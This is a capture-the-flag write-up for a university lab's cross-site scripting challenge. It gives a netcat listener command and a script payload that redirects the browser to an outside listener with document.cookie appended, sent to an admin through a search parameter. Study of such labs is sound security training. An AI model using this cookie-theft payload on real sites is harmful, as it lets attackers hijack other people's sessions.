# Challenge `My favourite cookies` writeup

- Vulnerability: Cross-Site Scripting Lab (XSS)

- Where: feedback_link input through search input (lure admin)

- Impact: attacker is able to inject malicious code in the webpage in order to get other's person cookies
---

## Steps to reproduce

1. Host a machine in Técnico, SSH to nexus.rnl.tecnico.ulisboa.pt (e.g. ssh <your_ist_user>@nexus.rnl.tecnico.ulisboa.pt).
2. Run nc -vv -l -p PORT (use a PORT between 30000 and 40000). Server is now listening on any address 30000.
3. Create a script that use 'window.location.href' property to set the URL to a new location (nexus server).
4. Use the 'encodeURIComponent' function to make sure the cookie value is properly encoded to use in a URL and concat it with the nexus server link, like this:
- 'http://nexus.rnl.tecnico.ulisboa.pt:PORT/?cookie='.concat(encodeURIComponent(document.cookie))
5. Add the script to the feedback_link with search exploit for code injection, like this:
- http://mustard.stt.rnl.tecnico.ulisboa.pt:23251/?search=SCRIPT
6. Submit it (lure admin)

[(POC)](My_favourite_cookies.txt)

